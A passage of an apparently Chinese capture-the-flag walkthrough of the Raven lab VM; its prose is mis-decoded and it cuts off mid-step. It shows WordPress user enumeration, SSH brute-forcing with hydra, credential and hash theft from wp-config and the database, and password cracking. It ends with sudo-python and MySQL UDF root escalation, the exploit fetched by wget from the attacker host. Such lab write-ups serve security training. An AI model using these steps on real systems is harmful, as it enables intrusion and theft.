´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.149:80</span><br>---- Scanning URL: http://192.168.135.149:80/ ----<br>+ http://192.168.135.149:80/index.html (CODE:200|SIZE:16819)<br>+ http://192.168.135.149:80/server-status (CODE:403|SIZE:303)<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/<br> <br>---- Entering directory: http://192.168.135.149:80/wordpress/ ----<br>+ http://192.168.135.149:80/wordpress/index.php (CODE:301|SIZE:0)<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-admin/<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-content/<br>==&gt; DIRECTORY: http://192.168.135.149:80/wordpress/wp-includes/<br>+ http://192.168.135.149:80/wordpress/xmlrpc.php (CODE:405|SIZE:42)<br></code></pre></td></tr></table></figure><p>è®¿é—®æŸ¥çœ‹ï¼Œç‚¹å‡» <code>SERVICE</code> è·³è½¬è‡³ <code>http://192.168.135.149/service.html</code> ï¼Œåœ¨å…¶æºç ä¸­æ‰¾åˆ° flag1ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- End footer Area --&gt;</span><br><span class="hljs-comment">&lt;!-- flag1&#123;b9bbcb33e11b80be759c4e844862482d&#125; --&gt;</span><br></code></pre></td></tr></table></figure><p>ç‚¹å‡» <code>BLOG</code> è·³è½¬è‡³ <code>http://192.168.135.149/wordpress/</code> ï¼Œå‘ç°æ˜¯ä¸ª WordPress ç«™ç‚¹ã€‚</p><blockquote><p>å‘ç°ç‚¹å‡» blog çš„æ—¶å€™ç³»ç»Ÿè¿Ÿè¿Ÿè·³è½¬ä¸å‡ºæ¥æœåŠ¡é¡µé¢ï¼Œåé¢å‘ç°è·³è½¬åˆ° raven.localï¼Œæ‰€ä»¥ä¿®æ”¹ä¸€ä¸‹ hosts æ–‡ä»¶ï¼Œæ–¹ä¾¿æ¢ç´¢ã€‚</p></blockquote><p>ç‚¹å‡» <code>Login</code> è·³è½¬è‡³ <code>http://192.168.135.149/wordpress/wp-login.php</code> ï¼Œå‘ç°æ˜¯ WordPress ç™»å½•é¡µã€‚</p><p>æšä¸¾ WordPress ç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress --enumerate u</span><br>[+] URL: http://192.168.135.149/wordpress/ [192.168.135.149]<br>[i] User(s) Identified:<br><br>[+] michael<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] steven<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ cewl å¯¹ç«™ç‚¹ç”Ÿæˆå­—å…¸ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cewl http://192.168.135.149/wordpress -w passwd.txt</span><br>CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;michael\nsteven&quot;</span> &gt; user.txt</span> <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat user.txt</span>                  <br>michael<br>steven<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ wpscan è¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P passwd.txt</span><br>[+] URL: http://192.168.135.149/wordpress/ [192.168.135.149]<br>[i] No Valid Passwords Found.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æ¢ä¸ªå¤§å­—å…¸, æ‰«äº†å‡ ä¸‡ä¸ªæ²¡æ‰«åˆ°, ç›´æ¥ç»“æŸäº†, çœ‹æ¥æ˜¯çˆ†ä¸å‡ºæ¥</span><br><span class="hljs-meta">$</span><span class="bash"> wpscan --url http://192.168.135.149/wordpress -U user.txt -P /usr/share/wordlists/rockyou.txt</span><br></code></pre></td></tr></table></figure><p><strong>22ç«¯å£</strong></p><p>å¾—åˆ°ä¸¤ä¸ªç”¨æˆ·åï¼Œå¯¹ SSH è¿›è¡Œçˆ†ç ´å°è¯•ã€‚</p><p><strong>111ç«¯å£</strong></p><p>æŸ¥çœ‹æ— æœ</p><p><strong>37354ç«¯å£</strong></p><p>æŸ¥çœ‹æ— æœ</p><h2 id="äºŒã€æƒé™è·å–"><a href="#äºŒã€æƒé™è·å–" class="headerlink" title="äºŒã€æƒé™è·å–"></a>äºŒã€æƒé™è·å–</h2><p>ä½¿ç”¨ hydra å¯¹ SSH è¿›è¡Œçˆ†ç ´ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P passwd.txt 192.168.135.149 ssh</span><br>1 of 1 target completed, 0 valid password found<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> æ¢ä¸ªå¤§å­—å…¸</span><br><span class="hljs-meta">$</span><span class="bash"> hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.135.149 ssh</span><br>[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task<br>[DATA] attacking ssh://192.168.135.149:22/<br>[22][ssh] host: 192.168.135.149   login: michael   password: michael<br>[STATUS] 14344553.00 tries/min, 14344553 tries in 00:01h, 14344247 to do in 00:01h, 16 active<br></code></pre></td></tr></table></figure><p>æˆåŠŸçˆ†ç ´å‡ºä¸€ç»„è´¦å·ï¼š<code>login: michael   password: michael</code> ï¼Œsteven è´¦å·å¯†ç ä¹Ÿåœ¨å­—å…¸ä¸­ï¼Œä½†ç ´è§£å‡ºæ¥éœ€è¦è¾ƒé•¿æ—¶é—´ã€‚</p><p>ç™»å½• SSHï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh michael@192.168.135.149</span>                                                                               <br>michael@192.168.135.149&#x27;s password: <br><br>michael@Raven:~$ ls<br>michael@Raven:~$ whoami<br>michael<br>michael@Raven:~$ id<br>uid=1000(michael) gid=1000(michael) groups=1000(michael),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ find æŸ¥æ‰¾ flagï¼Œå¾—åˆ° flag2ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ find / -name &quot;*flag*.txt&quot; 2&gt;/dev/null<br>/var/www/flag2.txt<br>michael@Raven:~$ cat /var/www/flag2.txt<br>flag2&#123;fc3fd58dcdad9ab23faca6e9a36e581c&#125;<br></code></pre></td></tr></table></figure><p>WordPress ç½‘ç«™æ˜¯å¸¦æ•°æ®åº“çš„ï¼Œæ•°æ®åº“å¯†ç åœ¨ç½‘ç«™çš„é…ç½®æ–‡ä»¶ä¸­ï¼›WordPress ä½œä¸ºä¸€æ¬¾å¼€æºçš„ CMSï¼Œé…ç½®æ–‡ä»¶çš„è·¯å¾„æ˜¯å›ºå®šçš„ã€‚ </p><p>æŸ¥çœ‹æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼Œå¾—åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> cat /var/www/html/wordpress/wp-config.php</span><br>/** The name of the database for WordPress */<br>define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);<br><br>/** MySQL database username */<br>define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);<br><br>/** MySQL database password */<br>define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);<br><br>/** MySQL hostname */<br>define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);<br><br>/** Database Charset to use in creating database tables. */<br>define(&#x27;DB_CHARSET&#x27;, &#x27;utf8mb4&#x27;);<br><br>/** The Database Collate type. Don&#x27;t change this if in doubt. */<br>define(&#x27;DB_COLLATE&#x27;, &#x27;&#x27;);<br></code></pre></td></tr></table></figure><p>ç™»å½• mysqlï¼Œé€‰æ‹© <code>wordpress</code> æ•°æ®åº“ï¼Œåœ¨ <code>wp_posts</code> è¡¨ä¸­æ‰¾åˆ° flag3ã€flag4ï¼Œåœ¨ <code>wp_users</code> è¡¨ä¸­æ‰¾åˆ°ä¸¤ä¸ªç”¨æˆ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ mysql -uroot -p<br>Enter password: <br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show databases;</span><br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| wordpress          |<br>+--------------------+<br>4 rows in set (0.01 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show tables;</span><br>+-----------------------+<br>| Tables_in_wordpress   |<br>+-----------------------+<br>| wp_commentmeta        |<br>| wp_comments           |<br>| wp_links              |<br>| wp_options            |<br>| wp_postmeta           |<br>| wp_posts              |<br>| wp_term_relationships |<br>| wp_term_taxonomy      |<br>| wp_termmeta           |<br>| wp_terms              |<br>| wp_usermeta           |<br>| wp_users              |<br>+-----------------------+<br>12 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from wp_posts;</span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select ID, post_author,post_content from wp_posts <span class="hljs-built_in">where</span> post_content like <span class="hljs-string">&quot;flag%&quot;</span>;</span><br>+----+-------------+-----------------------------------------+<br>| ID | post_author | post_content                            |<br>+----+-------------+-----------------------------------------+<br>|  4 |           1 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125; |<br>|  5 |           1 | flag4&#123;715dea6c055b9fe3337544932f2941ce&#125; |<br>|  7 |           2 | flag3&#123;afc01ab56b50591e7dccf93122770cd2&#125; |<br>+----+-------------+-----------------------------------------+<br>3 rows in set (0.00 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from wp_users;</span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select ID,user_login,user_pass from wp_users;</span><br>+----+------------+------------------------------------+<br>| ID | user_login | user_pass                          |<br>+----+------------+------------------------------------+<br>|  1 | michael    | $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0 |<br>|  2 | steven     | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ |<br>+----+------------+------------------------------------+<br>2 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€æƒé™æå‡"><a href="#ä¸‰ã€æƒé™æå‡" class="headerlink" title="ä¸‰ã€æƒé™æå‡"></a>ä¸‰ã€æƒé™æå‡</h2><h3 id="1ã€Sudo"><a href="#1ã€Sudo" class="headerlink" title="1ã€Sudo"></a>1ã€Sudo</h3><p>michael ç”¨æˆ·æ²¡æœ‰ sudo æƒé™ï¼Œæ—¢ç„¶å·²ç»å¾—åˆ°äº† steven çš„åŠ å¯†å¯†ç ï¼Œå¯ä»¥å°è¯•è¿›è¡Œç ´è§£ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½åˆ‡æ¢åˆ° Steven ã€‚</p><p>ä½¿ç”¨ john è¿›è¡Œç ´è§£ï¼ŒæˆåŠŸå¾—åˆ° steven å¯†ç ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/&#x27;</span> &gt; 1.txt</span><br><span class="hljs-meta">$</span><span class="bash"> john 1.txt --show</span><br>0 password hashes cracked, 1 left<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt 1.txt</span>       <br>Using default input encoding: UTF-8<br>Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])<br>Cost 1 (iteration count) is 8192 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>pink84           (?)<br>1g 0:00:00:08 DONE (2022-06-27 09:51) 0.1203g/s 5522p/s 5522c/s 5522C/s tamika1..milkdud<br>Use the &quot;--show --format=phpass&quot; options to display all of the cracked passwords reliably<br>Session completed<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ä½¿ç”¨åœ¨çº¿è§£å¯†ï¼š<a href="https://www.somd5.com/">MD5å…è´¹åœ¨çº¿è§£å¯†ç ´è§£_MD5åœ¨çº¿åŠ å¯†-SOMD5</a></p><p>åˆ‡æ¢è‡³ steven ï¼ŒæŸ¥çœ‹å…¶æƒé™ï¼Œå‘ç°å¯ä»¥ sudo è¿è¡Œ pythonï¼Œä½¿ç”¨ python è¿›è¡Œææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ su steven<br>Password: <br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1001(steven) gid=1001(steven) groups=1001(steven)<br><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>Matching Defaults entries for steven on raven:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User steven may run the following commands on raven:<br>    (ALL) NOPASSWD: /usr/bin/python<br><span class="hljs-meta">$</span><span class="bash"> sudo python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br>root@Raven:/home/michael# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@Raven:/home/michael# find / -name &quot;*flag*.txt&quot; 2&gt;/dev/null<br>/var/www/flag2.txt<br>/root/flag4.txt<br>root@Raven:/home/michael# cat /root/flag4.txt<br>______                      <br>| ___ \                     <br>| |_/ /__ ___   _____ _ __  <br>|    // _` \ \ / / _ \ &#x27;_ \ <br>| |\ \ (_| |\ V /  __/ | | |<br>\_| \_\__,_| \_/ \___|_| |_|<br><br>flag4&#123;715dea6c055b9fe3337544932f2941ce&#125;<br>CONGRATULATIONS on successfully rooting Raven!<br>This is my first Boot2Root VM - I hope you enjoyed it.<br>Hit me up on Twitter and let me know what you thought: <br>@mccannwj / wjmccann.github.io<br></code></pre></td></tr></table></figure><p>å†æ¬¡æŸ¥æ‰¾ flag æ–‡ä»¶ï¼Œå¾—åˆ° flag4 ã€‚</p><h3 id="2ã€MySQL-UDF"><a href="#2ã€MySQL-UDF" class="headerlink" title="2ã€MySQL UDF"></a>2ã€MySQL UDF</h3><p>æŸ¥çœ‹ mysql ç‰ˆæœ¬ã€ä½ç½®åŠ <code>secure_file_priv</code> é€‰é¡¹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> mysql --version</span><br>mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3<br><span class="hljs-meta">$</span><span class="bash"> whereis mysql</span><br>mysql: /usr/bin/mysql /usr/lib/mysql /etc/mysql /usr/share/mysql /usr/share/man/man1/mysql.1.gz<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">which</span> mysql</span><br>/usr/bin/mysql<br><span class="hljs-meta">$</span><span class="bash"> mysql -uroot -p</span><br>Enter password: <br><span class="hljs-meta">mysql&gt;</span><span class="bash"> show global variables like <span class="hljs-string">&#x27;secure%&#x27;</span>;</span><br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_auth      | OFF   |<br>| secure_file_priv |       |<br>+------------------+-------+<br>2 rows in set (0.01 sec)<br></code></pre></td></tr></table></figure><p>æŸ¥æ‰¾åˆ©ç”¨è„šæœ¬ï¼Œè¿™é‡Œä½¿ç”¨ <code>1518.c</code> ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit mysql udf</span><br>------------------------------------------------------------------------------ -----------------------------<br> Exploit Title                                                                |  Path<br>------------------------------------------------------------------------------ -----------------------------<br>MySQL 4.0.17 (Linux) - User-Defined Function (UDF) Dynamic Library (1)        | linux/local/1181.c<br>MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)       | linux/local/1518.c<br>MySQL 4/5/6 - UDF for Command Execution                                       | linux/local/7856.txt<br>------------------------------------------------------------------------------ -----------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> searchsploit -m 1518.c</span>   <br>  Exploit: MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)<br>      URL: https://www.exploit-db.com/exploits/1518<br>     Path: /usr/share/exploitdb/exploits/linux/local/1518.c<br>File Type: C source, ASCII text, with CRLF line terminators<br><br>Copied to: /home/kali/1518.c<br></code></pre></td></tr></table></figure><p>è„šæœ¬ç»™äºˆçš„åˆ©ç”¨è¿‡ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Usage:</span><br><span class="hljs-comment"> * $ id</span><br><span class="hljs-comment"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span><br><span class="hljs-comment"> * $ gcc -g -c raptor_udf2.c</span><br><span class="hljs-comment"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="hljs-comment"> * $ mysql -u root -p</span><br><span class="hljs-comment"> * Enter password:</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> * mysql&gt; use mysql;</span><br><span class="hljs-comment"> * mysql&gt; create table foo(line blob);</span><br><span class="hljs-comment"> * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));</span><br><span class="hljs-comment"> * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="hljs-comment"> * mysql&gt; select * from mysql.func;</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | name      | ret | dl             | type     |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * | do_system |   2 | raptor_udf2.so | function |</span><br><span class="hljs-comment"> * +-----------+-----+----------------+----------+</span><br><span class="hljs-comment"> * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span><br><span class="hljs-comment"> * mysql&gt; \! sh</span><br><span class="hljs-comment"> * sh-2.05b$ cat /tmp/out</span><br><span class="hljs-comment"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span><br><span class="hljs-comment"> * [...]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡å°è¯•ï¼Œåœ¨é¶æœºä¸èƒ½æˆåŠŸç¼–è¯‘ï¼Œæ‰€ä»¥åœ¨æ”»å‡»æœºä¸Šè¿›è¡Œç¼–è¯‘ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gcc -g -c 1518.c</span><br><span class="hljs-meta">$</span><span class="bash"> gcc -g -shared -Wl,-soname,1518.so -o 1518.so 1518.o -lc</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡ python å¼€å¯æœ¬åœ° http æœåŠ¡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> python -m SimpleHTTPServer 8888</span><br></code></pre></td></tr></table></figure><p>åœ¨åˆšåˆšè·å–çš„ä½æƒé™ç”¨æˆ·ä¸­è·å–ç›®æ ‡æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> wget http://192.168.135.141:8888/1518.so</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls</span><br>1518.c  1518.o  1518.so<br></code></pre></td></tr></table></figure><p>è¿›è¡Œææƒï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs shell">michael@Raven:~$ mysql -u root -p<br>Enter password: <br>Welcome to the MySQL monitor.  Commands end with ; or \g.<br>Your MySQL connection id is 63451<br>Server version: 5.5.60-0+deb8u1 (Debian)<br><br>Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.<br><br>Oracle is a registered trademark of Oracle Corporation and/or its<br>affiliates. Other names may be trademarks of their respective<br>owners.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> use wordpress;</span><br>Reading table information for completion of table and column names<br>You can turn off this feature to get a quicker startup with -A<br><br>Database changed<br><span class="hljs-meta">mysql&gt;</span><span class="bash"> create table foo(line blob);</span><br>Query OK, 0 rows affected (0.04 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> insert into foo values(load_file(<span class="hljs-string">&#x27;/home/michael/1518.so&#x27;</span>));</span><br>Query OK, 1 row affected (0.02 sec)<br><span class="hljs-meta"></span><br><span class="hljs-meta">mysql&gt;</span><span class="bash"> select * from foo into dumpfile <span 